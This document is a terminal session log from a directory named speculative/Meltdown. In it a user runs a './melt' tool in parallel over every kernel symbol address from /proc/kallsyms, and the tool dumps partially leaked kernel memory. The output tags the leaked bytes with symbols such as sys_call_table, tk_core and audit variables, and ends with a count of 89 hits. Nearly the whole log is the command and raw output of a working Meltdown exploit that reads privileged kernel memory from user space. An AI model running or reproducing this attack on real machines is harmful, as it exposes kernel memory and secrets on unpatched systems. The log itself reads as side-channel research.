xeb@zanzibar:~/speculative/Meltdown$ shuf /proc/kallsyms | parallel -P32 './melt $(echo {} | cut -d" " -f1) | egrep "[1-9a-f][1-9a-f] [1-9a-f][1-9a-f]" && echo hit for: {}' | tee -a kallsymshits.txt
0xffffffff82107fd0: ?? ?? ?? ?? 00 00 ?? 00 60 62 ca 00 00 88 ?? ?? 
hit for: ffffffff82107fc4 B pat_debug_enable
0xffffffff81a11e40: ?? 00 ?? 75 5f 75 00 00 00 00 ?? 00 00 00 00 00 
hit for: ffffffff81a11e58 R cpu_active_mask
0xffffffff81dbdb00: 37 00 00 00 00 00 11 ba 00 00 00 00 00 00 00 00 
hit for: ffffffff81dbdb14 r __kstrtab_hrtimer_init_sleeper
0xffffffff82178760: 3e b9 00 00 00 00 00 00 ?? ?? 00 00 ?? 00 00 00 
0xffffffff82178770: 00 00 00 00 00 00 00 00 00 e2 de 05 04 88 ff ff 
hit for: ffffffff82178750 b last_check.57905
0xffffffff821d05e0: ?? ?? ?? ?? ?? ?? ?? 00 ?? 00 ?? 0e 04 88 ff ?? 
hit for: ffffffff821d05f0 b anon_vma_cachep
0xffffffff81f38dc0: ?? ?? ?? ?? 00 00 ?? ?? ff ?? ff ff ff ff ?? ff 
hit for: ffffffff81f38dc0 d __print_once.39291
0xffffffffc0738100: 60 04 a8 00 ?? 29 f4 79 00 67 ?? 00 00 ?? ?? ?? 
hit for: ffffffffc0738100 r __func__.56032	[iwldvm]
0xffffffff81a52c40: ?? ?? 00 00 00 ?? ?? 00 ?? 00 ?? 00 00 ?? ff ff 
0xffffffff81a52c50: ?? 70 10 ?? 0a ?? ff ff ?? 70 10 00 06 00 ?? ?? 
hit for: ffffffff81a52c60 r decpair
0xffffffff82109f10: ?? a9 c8 00 00 88 ?? 00 ?? ?? ?? ?? ?? ?? ?? ?? 
hit for: ffffffff82109f30 b __key.58500
0xffffffff81e502e0: ?? c6 2d ?? 08 ?? ?? ?? b0 71 0b ?? 10 55 22 ?? 
0xffffffff81e502f0: 01 ?? ?? ?? 80 8d 5b ?? 80 a8 12 01 19 ?? 00 ?? 
hit for: ffffffff81e502e0 D sysctl_sched_wakeup_granularity
0xffffffff82178760: 54 b9 ?? ?? ?? ?? ?? ?? ?? ?? ?? 00 ?? ?? 00 ?? 
0xffffffff82178770: ?? ?? ?? ?? 00 ?? ?? 00 ?? e2 de 05 04 ?? ff ff 
hit for: ffffffff82178768 b last_msg.57919
0xffffffff81f3ba70: ?? 00 02 ?? ?? ?? ?? 00 fa ff ?? ?? 00 ?? ?? 00 
hit for: ffffffff81f3ba68 D sysctl_admin_reserve_kbytes
0xffffffff81f3de90: ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? 88 ff ff 
hit for: ffffffff81f3deb0 d inode_hashtable
0xffffffff82178890: 00 e1 ?? 0c 04 88 ff ff ?? e2 70 0c 04 88 ff ff 
0xffffffff821788a0: a0 88 17 82 ff ff ff ff a0 88 17 82 ff ff ff ff 
0xffffffff821788b0: b0 88 17 82 ff ff ff ff b0 88 17 82 ff ff ff ff 
hit for: ffffffff82178890 b audit_watch_group
0xffffffff81e6f610: ?? ?? cb 81 ?? 00 ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? 
hit for: ffffffff81e6f600 d args__munmap
0xffffffff81f3ba40: ?? ?? 01 ?? ?? ?? ?? ?? ff e5 41 ?? ?? 00 ?? ?? 
0xffffffff81f3ba70: 00 ?? 02 ?? ?? ?? ?? ?? fa ff 00 ?? ?? ?? ?? ?? 
hit for: ffffffff81f3ba48 D highest_memmap_pfn
0xffffffff82178890: ?? e1 70 0c 04 88 ff ff ?? e2 70 0c 04 88 ff ff 
0xffffffff821788a0: a0 88 17 82 ff ?? ff ff a0 88 17 ?? ff ff ff ff 
0xffffffff821788b0: ?? 88 17 82 ff ff ff ff ?? 88 17 82 ff ff ff ff 
hit for: ffffffff82178884 B audit_n_rules
0xffffffff82178770: 00 00 ?? ?? 00 00 00 00 ?? e2 de 05 04 88 ff ff 
hit for: ffffffff82178744 B audit_pid
0xffffffff81db7230: 1b 38 00 11 c7 04 00 01 00 00 02 01 00 00 00 00 
hit for: ffffffff81db7220 r __kcrctab_regulator_is_supported_voltage
0xffffffff81f36680: 00 ?? ?? ?? ?? ?? 00 ?? ?? 00 ?? ?? ?? 95 27 ?? 
0xffffffff81f36690: 91 95 27 ?? ?? ?? ?? ?? ?? ?? ?? 00 ?? ?? ?? ?? 
hit for: ffffffff81f36684 d tsc_disabled
0xffffffff82109f10: ?? ?? 00 ?? 00 00 00 ?? 00 00 00 0e 00 00 ff ff 
hit for: ffffffff82109f18 B sighand_cachep
0xffffffff81f36690: 00 95 27 00 ?? ?? ?? 00 00 ?? ?? ?? 00 ?? 00 00 
hit for: ffffffff81f36688 d tsc_unstable
0xffffffff82178890: ?? e1 70 0c 04 88 ff ff ?? 00 70 0c 04 88 ff ff 
0xffffffff821788a0: a0 88 17 82 ff ff ff ff a0 88 17 82 ff ff ff ff 
0xffffffff821788b0: b0 88 17 82 ff ff ff ff b0 88 17 82 ff ff ff ff 
hit for: ffffffff821788a0 b chunk_hash_heads
0xffffffff81fabe00: 01 ac 3f ?? 37 0c 58 25 08 00 00 00 00 00 00 00 
hit for: ffffffff81fabe11 t trace_event_define_fields_random_read
0xffffffff81d8f0c0: 06 29 2d 28 00 00 00 0f 00 00 00 00 00 00 00 00 
hit for: ffffffff81d8f0f0 R __ksymtab_iowrite16
0xffffffff81e2a5c0: 00 ?? 05 81 ff ?? ?? ?? ?? ?? ?? 00 ?? 00 ?? ?? 
hit for: ffffffff81e2a5f8 d stopping_cpu
0xffffffff81f3ba40: ?? 00 01 ?? ?? ?? ?? 00 ff e5 00 00 00 00 ?? 00 
hit for: ffffffff81f3ba40 d fault_around_bytes
0xffffffff81db81a0: 00 68 00 1b 1c 00 00 00 00 00 00 00 00 00 0e 00 
hit for: ffffffff81db8188 r __kcrctab_sysfs_create_group
0xffffffff81dd6000: 00 00 53 00 00 6f 00 00 00 00 00 00 63 53 00 00 
0xffffffff81dd6010: 00 6b d3 4d 00 00 00 00 00 00 00 00 5f 00 4d 00 
hit for: ffffffff81dd601a r __kstrtab_ata_std_prereset
0xffffffff81e502f0: ?? ?? ?? 00 ?? 8d 5b 00 80 a8 12 01 19 ?? 00 00 
hit for: ffffffff81e502d0 D sysctl_numa_balancing_scan_period_max
0xffffffff81f37a40: ?? ?? ?? ?? 04 88 ff 00 00 ?? 00 00 ?? ?? ?? 00 
0xffffffff81f37a50: ?? ?? 00 1e ?? 00 ?? ?? 00 ?? 2c ?? ?? 00 ff ff 
0xffffffff81f37a70: ?? ?? ?? 1e 04 88 ff ?? 00 ?? 00 ?? 04 88 ?? ?? 
hit for: ffffffff81f37a40 D __per_cpu_offset
0xffffffff82152980: 00 00 00 00 00 00 00 ?? 40 c1 c7 0c 04 88 ?? ff 
hit for: ffffffff82152991 B pm_freezing
0xffffffff82178760: 94 b9 ?? ?? 00 ?? 00 00 00 00 00 00 00 00 00 ?? 
0xffffffff82178770: 00 ?? ?? ?? ?? ?? ?? 00 ?? e2 de 05 04 88 ff ff 
hit for: ffffffff82178740 B audit_sig_sid
0xffffffff81f3ba40: 00 00 00 ?? 00 ?? ?? ?? ?? e5 41 00 00 00 ?? 00 
hit for: ffffffff81f3ba78 D sysctl_max_map_count
0xffffffff81f44080: 00 00 00 00 00 00 ?? ?? a9 b1 f8 ?? c8 3a ?? 00 
0xffffffff81f44090: ff ff 00 ff ?? ff 00 00 ?? af 62 ?? 00 ?? 00 ?? 
0xffffffff81f440a0: ed ?? 4a fa df a9 ?? ?? ?? fc ?? 5a ?? ?? 00 00 
0xffffffff81f440b0: 25 ?? ?? ?? ?? ?? ?? ?? 49 32 ?? 6f ?? ?? ?? 00 
hit for: ffffffff81f44080 D vsyscall_gtod_data
0xffffffff821d05c0: 00 ?? 00 00 00 ?? ?? ?? e9 cb 00 ?? 00 ?? ?? ?? 
hit for: ffffffff821d05c0 B vm_committed_as
0xffffffff82178890: 00 e1 70 0c 04 88 ?? ff ?? e2 70 0c 04 88 ff ff 
0xffffffff821788a0: a0 88 17 82 ff ff ff ff a0 88 17 82 ff ff ff ff 
0xffffffff821788b0: b0 88 17 82 ff ff ff ff ?? 88 17 82 ff ff ff ff 
hit for: ffffffff82178898 b audit_fsnotify_group
0xffffffff821548a0: ?? f4 a1 f3 bb 13 01 ?? ?? ?? ?? ?? 00 ?? 00 ?? 
hit for: ffffffff82154898 b ratelimit.37134
0xffffffff821e58a0: a0 30 1b 0d 04 88 ff ff c0 90 92 0c 04 88 ff ff 
hit for: ffffffff821e5880 B tomoyo_policy_loaded
0xffffffff81e50b00: ?? ?? 00 00 00 ?? ?? ?? 00 38 7b 06 04 88 ff ?? 
hit for: ffffffff81e50b00 d cpu_dma_constraints
0xffffffff81f3baa0: ?? 00 00 00 ?? ff ff ff ?? 00 ?? ?? ?? ?? 00 00 
hit for: ffffffff81f3baac D hugetlb_max_hstate
0xffffffffc0248140: 58 4f 64 70 81 00 4f 01 00 00 4f 00 00 01 00 00 
0xffffffffc0248150: 00 00 00 00 01 4b 47 00 00 00 00 01 22 13 60 01 
0xffffffffc0248170: 00 47 00 00 00 4b 13 4b 01 47 01 4f 13 c2 4f 01 
hit for: ffffffffc0248150 t vlv_punit_read	[i915]
0xffffffffc0930980: a7 7a 48 97 75 00 00 00 00 48 00 00 00 a1 00 00 
0xffffffffc0930990: 5e 00 7a 9d 00 a1 75 00 00 75 00 75 00 8f 7a 00 
0xffffffffc09309b0: 00 00 00 00 00 00 00 00 00 00 00 00 00 bd 48 ad 
hit for: ffffffffc09309a8 r __kcrctab_VBoxHost_RTNetIPv4AddUDPChecksum	[vboxdrv]
0xffffffff81f3b960: ?? ?? 00 ?? 00 00 00 ?? 01 ?? ?? 00 ff ff 00 03 
0xffffffff81f3b970: 62 a3 ?? ?? ?? ?? 00 ?? ?? ?? ?? ?? ?? ?? 00 ?? 
hit for: ffffffff81f3b96c D gfp_allowed_mask
0xffffffff82178760: bf b9 00 ?? ?? ?? 00 ?? ?? 00 ?? ?? ?? ?? ?? ?? 
0xffffffff82178770: ?? 00 00 ?? ?? 00 00 ?? 00 e2 de 05 04 88 ff ff 
hit for: ffffffff82178778 b kauditd_task
0xffffffff81e502d0: 00 ea ?? ?? 00 03 00 ?? 88 13 ?? 00 00 00 0f ?? 
0xffffffff81e502f0: 00 ?? 00 ?? 00 ?? 00 00 80 a8 12 01 00 00 00 00 
hit for: ffffffff81e502e4 d sched_nr_latency
0xffffffff81a3a9e0: 00 00 00 00 00 00 ?? 00 00 00 30 81 ff 00 00 00 
hit for: ffffffff81a3a9c0 R ecryptfs_dops
0xffffffff81e502e0: c0 c6 2d ?? ?? ?? ?? ?? ?? ?? 00 ?? 10 55 ?? ?? 
0xffffffff81e502f0: ?? ?? 00 ?? ?? 8d 5b ?? 00 a8 12 ?? 19 ?? ?? ?? 
hit for: ffffffff81e502f0 D sysctl_sched_tunable_scaling
0xffffffffc0204830: 08 06 02 01 03 18 08 0b 13 03 03 05 1b 18 02 07 
hit for: ffffffffc0204800 t trace_event_raw_event_i915_px_entry	[i915]
0xffffffff81f38e80: ?? 00 5e 1e 04 ?? ?? ?? ?? 00 ?? ?? 00 00 ?? 00 
hit for: ffffffff81f38e80 D node_data
0xffffffff81f3b960: ?? ?? ?? 00 ?? ?? 00 ?? ?? ?? ?? 00 ?? ff ff 03 
hit for: ffffffff81f3b970 D dirty_balance_reserve
0xffffffff81f3df20: ?? 22 ?? ?? 00 00 00 ff 00 00 00 ?? 04 88 ff ff 
hit for: ffffffff81f3df20 d dnotify_mark_cache
0xffffffff81f39220: 80 96 98 ?? 00 00 ?? ?? 20 a1 07 00 00 00 ?? ?? 
hit for: ffffffff81f39214 D sched_clock_running
0xffffffff81e502f0: ?? ?? ?? ?? 00 ?? ?? ?? ?? a8 12 ?? 19 ?? ?? ?? 
hit for: ffffffff81e502d8 D sysctl_sched_cfs_bandwidth_slice
0xffffffff82178760: e1 b9 00 00 00 00 ?? 00 00 00 00 ?? ?? 00 00 ?? 
0xffffffff82178770: 00 ?? ?? ?? 00 00 ?? ?? 00 e2 de 05 04 88 ff ff 
hit for: ffffffff82178760 b serial.58275
0xffffffff82178760: e1 b9 00 00 00 ?? 00 ?? ?? ?? 00 00 ?? 00 ?? ?? 
0xffffffff82178770: ?? ?? ?? 00 00 ?? 00 00 00 e2 00 05 04 88 ff ff 
hit for: ffffffff82178748 B audit_ever_enabled
0xffffffff81f3baa0: 00 00 ?? ?? 00 00 ff ff 09 ?? ?? 00 00 00 00 ?? 
hit for: ffffffff81f3baa0 d frontswap_ops
0xffffffff81a184c0: ?? ?? 00 00 ?? ?? 00 00 73 d3 c3 91 00 ?? ?? ?? 
hit for: ffffffff81a184e0 R fair_sched_class
0xffffffff82178760: e6 b9 ?? ?? ?? 00 00 ?? 00 00 00 00 00 00 ?? ?? 
0xffffffff82178770: ?? ?? ?? 00 00 00 00 ?? ?? e2 de 05 04 88 ff ff 
hit for: ffffffff82178758 b messages.57906
0xffffffffc006e830: 00 e3 41 ?? 91 ?? 28 00 00 00 00 00 00 00 00 00 
hit for: ffffffffc006e828 r __func__.40033	[drm]
0xffffffff81a00200: d0 14 21 81 ff ff ff ff 90 15 21 81 ff ff ff ff 
0xffffffff81a00210: a0 f9 20 81 ff ff ff ff 80 d8 20 81 ff ff ff ff 
0xffffffff81a00220: f0 ?? 21 81 ff ff ff ff 20 5e 21 81 ff ff ff ff 
0xffffffff81a00230: 00 5e 21 81 ff ff ff ff 10 6a 22 81 ff ff ff ff 
hit for: ffffffff81a00200 R sys_call_table
0xffffffff82178770: 00 ?? 00 00 ?? 00 ?? ?? 00 e2 de 05 04 88 ff ff 
hit for: ffffffff82178770 b lock.57920
0xffffffff821d05d0: 80 c8 ea 81 ff ff ff ff 10 94 e0 81 00 ?? ?? ?? 
hit for: ffffffff821d05e8 b __key.36935
0xffffffff82178770: ?? 00 00 ?? 00 00 00 00 00 e2 de 05 04 88 ff ff 
hit for: ffffffff8217874c B audit_enabled
0xffffffff81f3dee0: 0f ?? 00 ?? ?? ?? ?? ?? ?? ?? ?? ?? ff 7f ?? ?? 
hit for: ffffffff81f3dee4 d mp_hash_mask
0xffffffff821da740: 62 00 5e 00 aa 00 00 ?? 00 ?? 00 92 c2 00 00 00 
hit for: ffffffff821da760 b mb_cache_spinlock
0xffffffff82154280: 7c 58 0c 09 ?? ?? ?? ?? c0 7b e2 81 ff ff ?? ff 
0xffffffff82154290: ff ff ff ff ff ff ff ff 35 3a 6a 9a 00 3c 02 00 
0xffffffff821542a0: 87 af 62 ?? 18 00 00 00 7e 50 97 06 4a 24 18 00 
0xffffffff821542b0: 5b e9 90 cd 2c 14 01 ?? c0 7b e2 81 ?? ?? ff ff 
hit for: ffffffff82154280 b tk_core
0xffffffff821e58a0: a0 30 1b 0d 04 88 ff ff c0 90 92 0c 04 88 ff ff 
hit for: ffffffff821e58a0 B aa_null
0xffffffff81e22c00: 0f 43 94 00 00 30 78 0d 00 00 00 01 00 00 00 ff 
hit for: ffffffff81e22c00 d format_attr_occ_edge_det
0xffffffff81f3f7f0: ?? ?? ?? ?? ?? 88 ff ?? ?? ?? 00 ?? ?? ?? ?? ?? 
hit for: ffffffff81f3f7f0 D skbuff_head_cache
0xffffffff81f38dc0: 00 00 00 00 00 ?? ?? ?? ff ff ?? ?? ?? ?? ?? ?? 
hit for: ffffffff81f38dd0 d __print_once.37397
0xffffffff82109f00: 00 00 ?? 0e ?? 88 ff ?? ?? ?? ?? ?? ?? ?? ?? ?? 
hit for: ffffffff82109f24 B nr_threads
0xffffffff82178890: ?? e1 70 0c 04 88 ?? ff 00 e2 70 0c 04 88 ff ?? 
0xffffffff821788a0: a0 88 17 82 ?? ff ?? ff a0 88 17 82 ?? ff ff ff 
0xffffffff821788b0: b0 88 17 82 ff ff ff ff b0 88 17 82 ?? ff ff ?? 
hit for: ffffffff82178880 B audit_signals
0xffffffffc0687540: a4 00 69 58 ?? ?? ?? 00 ?? ?? ?? ?? 00 00 00 00 
hit for: ffffffffc0687568 b pathtbl_resize_lock	[mac80211]
0xffffffff8208e9c0: 00 15 c9 4c 5d 00 00 00 00 ?? ?? 37 29 00 00 00 
hit for: ffffffff8208e9e0 t TRACE_SYSTEM_MIGRATE_SYNC_LIGHT
0xffffffffc0869ac0: 05 14 16 13 00 1c 00 00 00 00 00 00 00 00 00 00 
hit for: ffffffffc0869ad8 d descriptor.57586	[bluetooth]
0xffffffff82109f10: ?? ?? ?? ?? 00 ?? ?? ?? ?? ?? ?? ?? ?? 00 ff ff 
hit for: ffffffff82109f00 B vm_area_cachep
0xffffffff81a18790: 00 ?? 00 00 ?? ff ff ff 80 3b 0c 81 ff ff ff ff 
0xffffffff81a187a0: ?? 00 ?? ?? ?? 00 ?? 00 50 3c 0c 81 ff 00 00 00 
hit for: ffffffff81a18780 R stop_sched_class
0xffffffff81a185f0: 00 00 00 00 ?? ff ff 00 00 ?? 00 00 ?? ?? 00 ?? 
hit for: ffffffff81a185c0 R rt_sched_class
0xffffffff821dd690: ?? 4f 44 ?? ?? 00 ?? ?? 00 00 ?? ?? ?? 00 ?? 00 
0xffffffff821dd6a0: 00 ?? 00 ?? 00 ?? ff ff ?? 00 ?? 0c 00 ?? ?? ?? 
hit for: ffffffff821dd6b0 b __key.45447
0xffffffff81eecd60: 00 0a 00 00 00 2d 26 00 00 00 00 0c 11 00 00 02 
hit for: ffffffff81eecd60 d rdev_state
0xffffffff81f3a350: ?? 60 8b ?? ?? c9 ff ff 00 ?? ?? ?? ?? ?? ?? ?? 
hit for: ffffffff81f3a360 D futex_cmpxchg_enabled
0xffffffff81f38dc0: 00 00 00 00 ?? 00 ?? 00 ff ff ff ff ff ff ff ff 
hit for: ffffffff81f38dc8 D __supported_pte_mask
0xffffffff81f3dd20: 00 00 00 00 00 ?? 00 00 ?? 00 c9 ?? 04 00 ff ff 
hit for: ffffffff81f3dd28 D mem_cgroup_root_css
0xffffffff82107fd0: ?? ?? 00 ?? 00 ?? 00 00 00 62 ?? ?? ?? 88 ff ff 
hit for: ffffffff82107fd8 b memtype_rbroot
0xffffffff82178760: 3e ba 00 00 00 00 ?? 00 ?? 00 00 ?? ?? 00 00 ?? 
0xffffffff82178770: 00 ?? ?? 00 ?? ?? ?? ?? 00 e2 de 05 04 88 ff ff 
hit for: ffffffff8217875c b lock.57907
0xffffffff82178890: 00 e1 70 0c 04 88 ff ff 00 e2 70 0c 04 88 ff ff 
0xffffffff821788a0: a0 88 17 ?? ff ff ff ff a0 88 17 82 ff ff ff ff 
0xffffffff821788b0: b0 88 17 82 ff ff ff ff b0 88 17 82 ff ff ff ff 
hit for: ffffffff82178888 b session_id


xeb@zanzibar:~/speculative/Meltdown$ grep hit kallsymshits.txt | tr -d '\\' | cut -d' ' -f3 | sort -u | wc -l; echo out of; wc -l /proc/kallsyms
89
out of
137310 /proc/kallsyms
xeb@zanzibar:~/speculative/Meltdown$ grep hit kallsymshits.txt | tr -d '\\' | cut -d' ' -f3 | sort -u | paste - - - - -
ffffffff81a00200	ffffffff81a11e58	ffffffff81a184e0	ffffffff81a185c0	ffffffff81a18780
ffffffff81a3a9c0	ffffffff81a52c60	ffffffff81d8f0f0	ffffffff81db7220	ffffffff81db8188
ffffffff81dbdb14	ffffffff81dd601a	ffffffff81e22c00	ffffffff81e2a5f8	ffffffff81e502d0
ffffffff81e502d8	ffffffff81e502e0	ffffffff81e502e4	ffffffff81e502f0	ffffffff81e50b00
ffffffff81e6f600	ffffffff81eecd60	ffffffff81f36684	ffffffff81f36688	ffffffff81f37a40
ffffffff81f38dc0	ffffffff81f38dc8	ffffffff81f38dd0	ffffffff81f38e80	ffffffff81f39214
ffffffff81f3a360	ffffffff81f3b96c	ffffffff81f3b970	ffffffff81f3ba40	ffffffff81f3ba48
ffffffff81f3ba68	ffffffff81f3ba78	ffffffff81f3ba99	ffffffff81f3baa0	ffffffff81f3baac
ffffffff81f3dd28	ffffffff81f3deb0	ffffffff81f3dee4	ffffffff81f3df20	ffffffff81f3f7f0
ffffffff81f44080	ffffffff81fabe11	ffffffff8208e9e0	ffffffff82107fc4	ffffffff82107fd8
ffffffff82109f00	ffffffff82109f18	ffffffff82109f24	ffffffff82109f30	ffffffff82152991
ffffffff82154280	ffffffff82154898	ffffffff82178740	ffffffff82178744	ffffffff82178748
ffffffff8217874c	ffffffff82178750	ffffffff82178758	ffffffff8217875c	ffffffff82178760
ffffffff82178768	ffffffff82178770	ffffffff82178778	ffffffff82178880	ffffffff82178884
ffffffff82178888	ffffffff82178890	ffffffff82178898	ffffffff821788a0	ffffffff821d05c0
ffffffff821d05e8	ffffffff821d05f0	ffffffff821da760	ffffffff821dd6b0	ffffffff821e5880
ffffffff821e58a0	ffffffffc006e828	ffffffffc0204800	ffffffffc0248150	ffffffffc027e668
ffffffffc0687568	ffffffffc0738100	ffffffffc0869ad8	ffffffffc09309a8	
xeb@zanzibar:~/speculative/Meltdown$